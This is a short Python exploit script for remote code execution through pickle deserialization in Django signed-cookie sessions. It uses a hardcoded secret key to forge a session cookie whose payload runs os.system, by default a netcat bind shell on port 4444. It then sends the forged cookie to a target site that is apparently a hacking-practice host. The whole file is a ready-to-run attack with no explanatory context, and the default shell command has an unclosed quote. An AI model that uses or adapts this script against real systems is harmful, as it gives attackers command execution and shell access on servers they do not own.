#!/usr/bin/python
import django.core.signing, django.contrib.sessions.serializers
from django.http import HttpResponse 
import cPickle
import os
import sys

SECRET_KEY = '6b361d38687be8d15baa5d54e447bf5e'
session_id = 'gAJ9cQFVCGxvZ2dlZGluSwBzLg:1jXOBE:OzRu48cJOs8esVdGgFIegz8loYY'
COMMAND = sys.argv[1] if len(sys.argv) > 1 else "netcat -c '/bin/bash -i -l -p 4444"
newContent = django.core.signing.loads(session_id, key=SECRET_KEY, serializer=django.contrib.sessions.serializers.PickleSerializer, salt='django.contrib.sessions.backends.signed_cookies')

class PickleRce(object):
    def __reduce__(self):
        return (os.system,(COMMAND,))
newContent['sessionid'] = PickleRce()
exploit = django.core.signing.dumps(newContent, key=SECRET_KEY, serializer=django.contrib.sessions.serializers.PickleSerializer, salt='django.contrib.sessions.backends.signed_cookies', compress=True)
print(exploit)
# request 
import requests
response = requests.get("https://python1.hackthe.company/", cookies={"sessionid":exploit})
print(response.content)
